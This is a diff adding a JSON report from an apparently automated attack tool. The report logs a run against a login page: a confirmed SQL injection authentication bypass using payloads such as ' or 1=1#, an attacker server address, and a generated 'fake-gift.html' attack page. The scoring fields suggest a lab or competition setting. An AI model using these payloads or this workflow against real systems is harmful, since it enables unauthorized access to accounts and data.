@@ -1,0 +1,100 @@
+{
+  "metadata": {
+    "target": "http://15.164.95.252/login.php",
+    "attacker_server": "http://13.158.67.78:5000",
+    "start_time": "2025-11-06 11:13:58",
+    "end_time": "2025-11-06 11:14:05",
+    "duration_seconds": 7,
+    "attacker_user_id": "1",
+    "tool_version": "1.0"
+  },
+  "summary": {
+    "total_vulnerabilities": 2,
+    "critical_count": 1,
+    "high_count": 1,
+    "vulnerability_breakdown": {
+      "sql_injection": 2,
+      "file_upload": 0,
+      "lfi": 0,
+      "xss": 0,
+      "csrf": 0
+    }
+  },
+  "vulnerabilities": {
+    "sql_injection": [
+      {
+        "url": "http://15.164.95.252/login.php/login.php",
+        "username": "admin",
+        "password": "' or '1'='1' --",
+        "description": "Basic single quote OR bypass (Error-based confirmed)",
+        "errors_found": [
+          "mysql",
+          "sql syntax",
+          "error in your sql"
+        ],
+        "impact": "HIGH - Database information disclosure via errors",
+        "cvss_score": 8.0
+      },
+      {
+        "url": "http://15.164.95.252/login.php/login.php",
+        "username": "admin",
+        "password": "' or 1=1#",
+        "description": "Hash comment bypass",
+        "response_time": 0.015377998352050781,
+        "bypass_method": "Advanced SQL Injection",
+        "redirect_location": "index.php",
+        "final_url": "http://15.164.95.252/index.php",
+        "impact": "CRITICAL - Authentication bypass via advanced SQLi",
+        "cvss_score": 9.8
+      }
+    ],
+    "xss": [],
+    "csrf": [],
+    "lfi": [],
+    "file_upload": []
+  },
+  "attack_timeline": [
+    {
+      "timestamp": "2025-11-06 11:13:58",
+      "type": "SCAN_START",
+      "description": "Security assessment started on http://15.164.95.252/login.php",
+      "severity": "INFO",
+      "details": {}
+    },
+    {
+      "timestamp": "2025-11-06 11:13:59",
+      "type": "ADVANCED_SQL_INJECTION",
+      "description": "Successfully bypassed authentication using: Hash comment bypass",
+      "severity": "CRITICAL",
+      "details": {
+        "payload": "username=admin, password=' or 1=1#",
+        "method": "Hash comment bypass",
+        "bypass_technique": "Advanced SQL Injection",
+        "response_time": 0.015377998352050781,
+        "points": 0
+      }
+    },
+    {
+      "timestamp": "2025-11-06 11:14:05",
+      "type": "SETUP",
+      "description": "Generated fake-gift.html attack page",
+      "severity": "INFO",
+      "details": {
+        "filename": "fake-gift.html",
+        "attacker_id": "1",
+        "attack_server": "http://13.158.67.78:5000"
+      }
+    },
+    {
+      "timestamp": "2025-11-06 11:14:05",
+      "type": "SCAN_COMPLETE",
+      "description": "Security assessment completed. 2 vulnerabilities found",
+      "severity": "INFO",
+      "details": {}
+    }
+  ],
+  "artifacts": {
+    "uploaded_webshell": null,
+    "fake_gift_page": "fake-gift.html"
+  }
+}
